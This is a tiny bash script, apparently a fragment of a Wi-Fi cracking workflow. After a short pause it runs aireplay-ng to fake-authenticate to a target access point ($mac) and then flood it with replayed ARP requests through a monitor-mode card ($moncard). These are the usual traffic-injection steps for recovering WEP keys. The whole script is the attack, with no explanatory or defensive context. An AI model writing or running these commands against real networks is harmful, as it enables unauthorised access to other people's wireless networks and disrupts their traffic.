#!/bin/bash

sleep 15s

aireplay-ng -1 0 -a $mac $moncard

aireplay-ng -3 -b $mac $moncard


